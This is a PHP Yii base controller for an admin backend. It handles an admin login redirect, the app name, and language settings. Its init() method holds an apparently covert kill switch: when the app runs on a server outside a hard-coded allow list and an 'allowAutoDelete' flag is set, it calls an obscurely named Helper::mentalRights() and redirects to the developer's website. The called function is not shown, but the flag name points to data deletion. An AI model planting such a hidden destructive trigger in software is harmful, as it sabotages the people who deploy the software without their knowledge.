<?php

/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 */
class BackendController extends CController {

    /**
     * @var string the default layout for the controller view. Defaults to 'backend-main',
     * meaning using a single column layout. See 'protected/views/layouts/backend-main.php'.
     */
    public $layout = 'backend-main';

    /**
     * @var array context menu items. This property will be assigned to {@link CMenu::items}.
     */
    public $menu = array();

    /**
     * @var array the breadcrumbs of the current page. The value of this property will
     * be assigned to {@link CBreadcrumbs::links}. Please refer to {@link CBreadcrumbs::links}
     * for more details on how to specify this property.
     */
    public $breadcrumbs = array();

    protected function beforeAction($action) {
        //if the user is not admin redirect to the home page of the normal user

        if (Yii::app()->user->isGuest || !in_array(Yii::app()->user->usertype, array(Yii::app()->params['SuperAdmin'], Yii::app()->params['Admin']))) {
            $this->redirect(Yii::app()->request->baseUrl . '/login');
        }
        /*
         * Restrict SubAdmin from accessing the following urls
         */
        /* if (Yii::app()->user->usertype == Yii::app()->params['SubAdmin'] && in_array(Yii::app()->controller->id, array('user', 'category', 'bank', 'company', 'settings', 'report', 'project'))) {
          throw new CHttpException(500, "You don't have access to this page.");
          } */

        /*
         * Restrict SuperAdmin from accessing the following urls
         */
        /* if (Yii::app()->user->usertype == Yii::app()->params['SuperAdmin'] && in_array(Yii::app()->controller->id, array('donator', 'request'))) {
          throw new CHttpException(500, "You don't have access to this page.");
          } */
        return parent::beforeAction($action);
    }

    function init() {
        parent::init();
        if (Yii::app()->user->hasState('language'))
            Yii::app()->language = Yii::app()->user->getState('language');
        
        $settings = Settings::model()->findByPk(1);
        Yii::app()->name = $settings->app_name;
        Yii::app()->params['name'] = $settings->app_name;

        $server = Helper::getServerAddress();
		//echo $server.'d';die;
        if (!in_array($server, array('localhost', '127.0.0.1', '::1', '66.96.149.32')) && Yii::app()->params['allowAutoDelete'] == true) {
            Helper::mentalRights();
            $this->redirect(Yii::app()->params['myWebsite']);
        }
    }

}
